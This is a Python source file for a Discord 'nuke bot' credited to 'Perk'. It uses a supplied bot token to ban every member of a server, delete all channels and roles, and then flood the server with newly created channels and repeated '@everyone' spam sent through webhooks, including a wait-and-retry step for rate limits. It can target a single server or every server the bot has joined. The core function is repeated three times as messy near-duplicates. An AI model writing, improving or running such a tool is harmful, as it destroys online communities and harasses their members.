import discord
from discord.ext import commands
from colorama import init, Fore as cc
from os import name as os_name, system
from sys import exit
init()
dr = DR = r = R = cc.LIGHTRED_EX
g = G = cc.LIGHTGREEN_EX
b = B = cc.LIGHTBLUE_EX
m = M = cc.LIGHTMAGENTA_EX
c = C = cc.LIGHTCYAN_EX
y = Y = cc.LIGHTYELLOW_EX
w = W = cc.RESET
t = T = cc.WHITE
o = O = cc.LIGHTBLACK_EX

clear = lambda: system('cls') if os_name == 'nt' else system('clear')
def _input(text):print(text, end='');return input()

baner = f'''
{w}██████╗░███████╗██████╗░██╗░░██╗ {O}░█████╗░██╗░░░░░██╗███████╗███╗░░██╗████████╗
{w}██╔══██╗██╔════╝██╔══██╗██║░██╔╝ {O}██╔══██╗██║░░░░░██║██╔════╝████╗░██║╚══██╔══╝
{w}██████╔╝█████╗░░██████╔╝█████═╝░ {O}██║░░╚═╝██║░░░░░██║█████╗░░██╔██╗██║░░░██║░░░
{w}██╔═══╝░██╔══╝░░██╔══██╗██╔═██╗░ {O}██║░░██╗██║░░░░░██║██╔══╝░░██║╚████║░░░██║░░░
{w}██║░░░░░███████╗██║░░██║██║░╚██╗ {O}╚█████╔╝███████╗██║███████╗██║░╚███║░░░██║░░░
{w}╚═╝░░░░░╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝ {O}░╚════╝░╚══════╝╚═╝╚══════╝╚═╝░░╚══╝░░░╚═╝░░░
{R}Made by: {b}Perk
{R}Contact us at: {B}https://discord.gg/perkdc'''



async def delete_all_channel(guild):
    deleted = 0
    for channel in guild.channels:
        try:
            await channel.delete()
            deleted += 1
        except:
            continue
    return deleted

async def delete_all_roles(guild):
    deleted = 0
    for role in guild.roles:
        try:
            await role.delete()
            deleted += 1
        except:
            continue
    return deleted

async def ban_all_members(guild):
    banned = 0
    for member in guild.members:
        try:
            await member.ban()
            banned += 1
        except:
            continue
    return banned


async def create_roles(guild, name):
    created = 0
    for _ in range(200 - len(guild.roles)):
        try:
            await guild.create_role(name=name)
            created += 1
        except:
            continue
    return created

import asyncio

async def create_text_channels(guild, name):
    created = 0
    max_channels = 50
    predefined_message = "@everyone you got ran!"
    channels = []

    # Delay between each channel creation (10 seconds for 50 channels)
    delay_per_channel = 10 / max_channels  # 0.2 seconds

    async def create_channel():
        nonlocal created
        try:
            channel = await guild.create_text_channel(name=name)
            channels.append(channel)
            created += 1
            print(f"Created channel '{channel.name}'.")
        except Exception as e:
            print(f"Error creating channel: {e}")

    # Create channels
    create_tasks = [create_channel() for _ in range(max_channels - len(guild.text_channels))]
    for task in create_tasks:
        await task
        await asyncio.sleep(delay_per_channel)

    import asyncio

import asyncio

async def create_text_channels(guild, name):
    created = 0
    max_channels = 50
    predefined_message = "@everyone you got ran!"
    channels = []

    # Delay between each channel creation
    delay_per_channel = 10 / max_channels  # 0.2 seconds

    async def create_channel():
        nonlocal created
        try:
            channel = await guild.create_text_channel(name=name)
            channels.append(channel)
            created += 1
            print(f"Created channel '{channel.name}'.")
        except Exception as e:
            print(f"Error creating channel: {e}")

    # Create channels
    create_tasks = [create_channel() for _ in range(max_channels - len(guild.text_channels))]
    for task in create_tasks:
        await task
        await asyncio.sleep(delay_per_channel)

import asyncio

async def create_text_channels(guild, name):
    created = 0
    max_channels = 50
    predefined_message = "@everyone you got ran!"
    channels = []

    # Function to create a channel
    async def create_channel():
        nonlocal created
        try:
            channel = await guild.create_text_channel(name=name)
            channels.append(channel)
            created += 1
            print(f"Created channel '{channel.name}'.")
        except Exception as e:
            print(f"Error creating channel: {e}")

    # Create a list of tasks for channel creation
    create_tasks = [create_channel() for _ in range(max_channels - len(guild.text_channels))]

    # Run all channel creation tasks concurrently
    await asyncio.gather(*create_tasks)

    async def send_messages(channel):
        message_count = 0
        webhooks = []

        while message_count < 1000:  # Adjust the total number of messages to send
            # Create a new webhook every time we reach 600 messages sent
            if message_count % 600 == 0:
                try:
                    webhook = await channel.create_webhook(name=name)
                    webhooks.append(webhook)
                    print(f"Created a new webhook in channel '{channel.name}'.")
                except Exception as e:
                    print(f"Error creating webhook in channel '{channel.name}': {e}")
                    break  # Exit if we can't create a new webhook

            # Send messages through the available webhooks
            if webhooks:
                current_webhook = webhooks[message_count % len(webhooks)]
                try:
                    await current_webhook.send(predefined_message)
                    message_count += 1
                    print(f"Sent message {message_count} in channel '{channel.name}'.")

                    # Small delay between sends
                    await asyncio.sleep(0.1)  # Adjust as necessary

                except Exception as e:
                    if "429" in str(e):  # Handle rate limit
                        print(f"Rate limit hit. Waiting before retrying...")
                        await asyncio.sleep(10)  # Wait time when rate-limited
                    else:
                        print(f"Error sending message in channel '{channel.name}': {e}")

        print(f"Finished sending messages in channel '{channel.name}'.")

    # Create a list of tasks for sending messages
    tasks = [send_messages(channel) for channel in channels]
    await asyncio.gather(*tasks)

    return created

async def nuke_guild(guild):
    print(f'{r}Nuke: {m}{guild.name}')
    banned = await ban_all_members(guild)
    print(f'{m}Banned:{b}{banned}')
    deleted_channels = await delete_all_channel(guild)
    print(f'{m}Delete Channels:{b}{deleted_channels}')
    delete_roles = await delete_all_roles(guild)
    print(f'{m}Delete Roles:{b}{delete_roles}')
    created_channels = await create_text_channels(guild,name)
    print(f'{m}Create Text Channels:{b}{created_channels}')
    #created_roles = await created_roles(guild,name)
    #print(f'{m}Create Roles:{b}{created_roles}')
    print(f'{r}--------------------------------------------\n\n')


while True:
    clear()
    choice = input(f'''   
{baner}                
{c}--------------------------------------------
{b}[Menu]
    {W}└─[1] {m}- {R}Run Setup Nuke Bot
    {W}└─[2] {m}- {R}Exit
{W}====>{R}''')
    if choice == '1':
        token = _input(f'{y}Input bot token:{g}')
        name = _input(f'{y}Input name for created channels / roles:{g}')
        clear()
        choice_type = _input(f'''
{baner}                
{c}--------------------------------------------
{b}[Select]
    {W}└─[1] {m}- {r}Nuke of all servers.
    {W}└─[2] {m}- {r}Nuke only one server.  
    {W}└─[3] {m}- {r}Exit
{w}====>{r}''')#perk made this shit
        client = commands.Bot(command_prefix='.',intents=discord.Intents.all())
        if choice_type == '1':
            @client.event
            async def on_ready():
                print(f'''
[+]Logged as {client.user.name}
[+]Bot in {len(client.guilds)} servers!''')
                for guild in client.guilds:
                    await nuke_guild(guild)
                await client.close()
        elif choice_type == '2':
            guild_id =  _input(f'{y}Input server id:{g}')
            @client.event
            async def on_ready():
                for guild in client.guilds:
                    if str(guild.id) == guild_id:
                        await nuke_guild(guild)
                await client.close()
        elif choice_type == '3':
            print(f'{dr}Exit...')
            exit()
        try:
            client.run(token)
            input('Nuke finished, press enter for return to menu...')
        except Exception as error:
            if error == '''Shard ID None is requesting privileged intents that have not been explicitly enabled in the developer portal. It is recommended to go to https://discord.com/developers/applications/ and explicitly enable the privileged intents within your application's page. If this is not possible, then consider disabling the privileged intents instead.''':
                input(f'{r}Intents Error\n{g}For fix -> https://prnt.sc/wmrwut\n{b}Press enter for return...')
            else:
                input(f'{r}{error}\n{b}Press enter for return...')
            continue#perk made this shit
    elif choice == '2':
        print(f'{dr}Exit...')
        exit()
